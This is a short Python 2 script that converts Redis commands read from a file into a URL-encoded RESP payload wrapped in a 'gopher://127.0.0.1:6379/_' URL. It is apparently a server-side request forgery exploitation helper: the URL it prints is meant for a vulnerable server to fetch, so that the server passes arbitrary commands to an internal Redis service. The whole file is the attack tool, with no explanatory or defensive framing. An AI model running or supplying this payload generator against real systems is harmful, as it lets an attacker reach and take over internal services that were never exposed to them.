import urllib

HOST = "127.0.0.1"
PORT = "6379"

exp = "gopher://%s:%s/_" % (HOST, PORT)

for line in open("redis.cmd", "r"):
    word = ""
    str_flag = False
    redis_resps = []
    for char in line:
        if str_flag == True:
            if char == '"' or char == "'":
                str_flag = False
                if word != "":
                    redis_resps.append(word)
                word = ""
            else:
                word += char
        elif word == "" and (char == '"' or char == "'"):
            str_flag = True
        else:
            if char == " ":
                if word != "":
                    redis_resps.append(word)
                word = ""
            elif char == "\n":
                if word != "":
                    redis_resps.append(word)
                word = ""
            else:
                word += char
    #print redis_resps
    tmp_line = '*' + str(len(redis_resps)) + '%0d%0a'
    for word in redis_resps:
        tmp_line += '%24' + str(len(word)) + '%0d%0a' + urllib.quote(word) +  '%0d%0a'
    exp += tmp_line

print exp
